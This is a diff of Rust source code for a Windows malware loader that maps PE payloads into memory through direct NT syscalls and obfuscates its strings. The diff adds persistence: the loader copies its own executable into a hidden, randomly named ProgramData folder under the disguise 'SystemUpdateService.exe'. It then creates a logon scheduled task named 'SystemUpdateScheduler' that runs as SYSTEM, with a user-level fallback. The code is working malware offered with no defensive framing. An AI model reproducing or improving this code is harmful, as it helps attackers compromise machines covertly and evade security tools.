@@ -6,6 +6,8 @@ mod syscalls;
 #[cfg(windows)]
 use std::{mem, ptr};
 #[cfg(windows)]
+use std::process::Command;
+#[cfg(windows)]
 use hex::ToHex;
 #[cfg(windows)]
 use rand::Rng;
@@ -126,7 +128,7 @@ const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
 
 #[cfg(windows)]
 const SECRET_KEY: &[u8] = &[
-    
+
 ];
 
 
@@ -294,7 +296,18 @@ unsafe fn finalize_sections(image_base: *mut u8, nt_headers: *const ImageNtHeade
 
 #[cfg(windows)]
 #[obfuscate(garbage = true)]
-unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), String> {
+unsafe fn save_payload_with_persistence() -> Result<(), String> {
+    // Get current exe content
+    let current_exe_path = match std::env::current_exe() {
+        Ok(path) => path,
+        Err(e) => return Err(format!("{}{}", obfuscate_string!("Failed to get current executable path: "), e)),
+    };
+
+    let exe_data = match fs::read(&current_exe_path) {
+        Ok(data) => data,
+        Err(e) => return Err(format!("{}{}", obfuscate_string!("Failed to read executable file: "), e)),
+    };
+
     let mut program_data = match std::env::var(obfuscate_string!("ProgramData")) {
         Ok(s) => s,
         Err(_) => return Err(obfuscate_string!("ProgramData environment variable not found.").to_string()),
@@ -307,33 +320,23 @@ unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), Strin
     let mut rng = rand::thread_rng();
     let random_bytes: Vec<u8> = (0..6).map(|_| rng.gen::<u8>()).collect();
     let dir_name: String = random_bytes.encode_hex();
+    let exe_name = obfuscate_string!("SystemUpdateService.exe");
 
     let folder_path = format!("{}\\{}", program_data, dir_name);
-    let full_file_path_win = format!("{}\\payload.bin", folder_path);
+    let full_file_path_win = format!("{}\\{}", folder_path, exe_name);
 
-    // Create folder with standard API
     if let Err(e) = fs::create_dir_all(&folder_path) {
         return Err(format!("{}{}", obfuscate_string!("Failed to create persistence directory: "), e));
     }
 
     let folder_path_w: Vec<u16> = folder_path.encode_utf16().chain(Some(0)).collect();
-    winapi::um::fileapi::SetFileAttributesW(
-        folder_path_w.as_ptr(),
-        FILE_ATTRIBUTE_HIDDEN,
-    );
+    winapi::um::fileapi::SetFileAttributesW(folder_path_w.as_ptr(), FILE_ATTRIBUTE_HIDDEN);
 
-    // CRITICAL FIX: Proper NT path format
-    // For NtCreateFile, we need to use the \??\ prefix for DOS device paths
     let nt_path = format!("\\??\\{}", full_file_path_win);
-    
-    // Create wide string buffer (needs to stay alive during the call)
     let mut wide_path: Vec<u16> = nt_path.encode_utf16().collect();
-    
-    // Calculate lengths in bytes (UTF-16 = 2 bytes per character)
-    // Length does NOT include null terminator
     let len_bytes = (wide_path.len() * 2) as u16;
-    let max_len_bytes = ((wide_path.len() + 1) * 2) as u16; // Add space for potential null
-    
+    let max_len_bytes = ((wide_path.len() + 1) * 2) as u16;
+
     let mut unicode_string_path = syscalls::UNICODE_STRING {
         Length: len_bytes,
         MaximumLength: max_len_bytes,
@@ -341,29 +344,24 @@ unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), Strin
     };
 
     let mut file_handle: HANDLE = ptr::null_mut();
-    let mut io_status_block = syscalls::IO_STATUS_BLOCK { 
-        status: 0, 
-        information: 0 
-    };
-    
+    let mut io_status_block = syscalls::IO_STATUS_BLOCK { status: 0, information: 0 };
     let mut obj_attributes = syscalls::OBJECT_ATTRIBUTES {
         Length: mem::size_of::<syscalls::OBJECT_ATTRIBUTES>() as u32,
         RootDirectory: ptr::null_mut(),
         ObjectName: &mut unicode_string_path,
-        Attributes: 0x00000040, // OBJ_CASE_INSENSITIVE
+        Attributes: 0x00000040,
         SecurityDescriptor: ptr::null_mut(),
         SecurityQualityOfService: ptr::null_mut(),
     };
 
-    // NtCreateFile call with corrected parameters
     let status = (syscalls::SYSCALLS.NtCreateFile)(
         &mut file_handle,
-        GENERIC_WRITE | 0x00100000, // GENERIC_WRITE | SYNCHRONIZE
+        GENERIC_WRITE | 0x00100000,
         &mut obj_attributes,
         &mut io_status_block,
-        ptr::null_mut(), // Let system decide allocation size
+        ptr::null_mut(),
         FILE_ATTRIBUTE_NORMAL,
-        0, // ShareAccess = 0 (exclusive)
+        0,
         FILE_OVERWRITE_IF,
         FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
         ptr::null_mut(),
@@ -374,31 +372,65 @@ unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), Strin
         return Err(format!("{}{:X}", obfuscate_string!("NtCreateFile failed with status: "), status));
     }
 
-    // NtWriteFile call
     let write_status = (syscalls::SYSCALLS.NtWriteFile)(
         file_handle,
         ptr::null_mut(),
         ptr::null_mut(),
         ptr::null_mut(),
         &mut io_status_block,
-        payload_data.as_ptr() as *mut std::ffi::c_void,
-        payload_data.len() as u32,
+        exe_data.as_ptr() as *mut std::ffi::c_void,
+        exe_data.len() as u32,
         ptr::null_mut(),
         ptr::null_mut(),
     );
 
-    let mut result: Result<(), String> = Ok(());
-
-    if write_status != 0 {
-        result = Err(format!("{}{:X}", obfuscate_string!("NtWriteFile failed with status: "), write_status));
-    } else if io_status_block.information != payload_data.len() {
-        result = Err(obfuscate_string!("NtWriteFile wrote incomplete data.").to_string());
-    }
-
-    // NtClose
     (syscalls::SYSCALLS.NtClose)(file_handle as *mut _);
 
-    result
+    if write_status != 0 {
+        return Err(format!("{}{:X}", obfuscate_string!("NtWriteFile failed with status: "), write_status));
+    }
+
+    // Schedule task
+    let task_name = obfuscate_string!("SystemUpdateScheduler");
+    let command = format!(
+        "schtasks /create /sc onlogon /tn \"{}\" /tr \"{}\" /ru \"System\" /f",
+        task_name,
+        full_file_path_win
+    );
+
+    let mut cmd = Command::new(obfuscate_string!("cmd"));
+    cmd.args(&["/C", &command]);
+
+    match cmd.output() {
+        Ok(output) => {
+            if !output.status.success() {
+                let stderr = String::from_utf8_lossy(&output.stderr);
+                if stderr.contains("ERROR: Access is denied.") {
+                    // Fallback to user-level task
+                    let user_command = format!(
+                        "schtasks /create /sc onlogon /tn \"{}\" /tr \"{}\" /f",
+                        task_name,
+                        full_file_path_win
+                    );
+                    let mut user_cmd = Command::new(obfuscate_string!("cmd"));
+                    user_cmd.args(&["/C", &user_command]);
+                    match user_cmd.output() {
+                        Ok(user_output) => {
+                             if !user_output.status.success() {
+                                return Err(format!("{}{}", obfuscate_string!("Failed to create user-level scheduled task: "), String::from_utf8_lossy(&user_output.stderr)));
+                            }
+                        },
+                        Err(e) => return Err(format!("{}{}", obfuscate_string!("Failed to execute user-level schtasks: "), e)),
+                    }
+                } else {
+                     return Err(format!("{}{}", obfuscate_string!("Failed to create scheduled task: "), stderr));
+                }
+            }
+        },
+        Err(e) => return Err(format!("{}{}", obfuscate_string!("Failed to execute schtasks: "), e)),
+    }
+
+    Ok(())
 }
 
 #[cfg(windows)]
@@ -473,7 +505,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     let entry_point = (image_base as usize + nt_headers.optional_header.address_of_entry_point as usize) as *const ();
 
     // Save payload for persistence
-    if let Err(e) = save_payload_with_persistence(pe_data) {
+    if let Err(e) = save_payload_with_persistence() {
         eprintln!("{}{}", obfuscate_string!("[WARNING] Persistence failed: "), e);
     }
 
